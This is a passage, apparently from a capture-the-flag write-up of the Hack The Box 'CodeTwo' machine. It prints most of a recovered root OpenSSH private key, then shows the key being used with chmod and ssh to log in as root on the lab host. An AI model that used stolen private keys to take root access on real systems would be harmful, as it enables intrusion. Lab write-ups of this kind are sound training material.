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
-----END OPENSSH PRIVATE KEY-----
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/CodeTwo/files]
└─$ chmod 600 root_id_rsa
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/CodeTwo/files]
└─$ ssh -i root_id_rsa root@10.129.151.101
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 16 Aug 2025 08:31:47 PM UTC

  System load:           0.0
  Usage of /:            56.9% of 5.08GB
  Memory usage:          23%
  Swap usage:            0%
  Processes:             227
  Users logged in:       1
  IPv4 address for eth0: 10.129.151.101
  IPv6 address for eth0: dead:beef::250:56ff:fe94:1924


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Aug 16 20:31:47 2025 from 10.10.16.21
root@codetwo:~#
```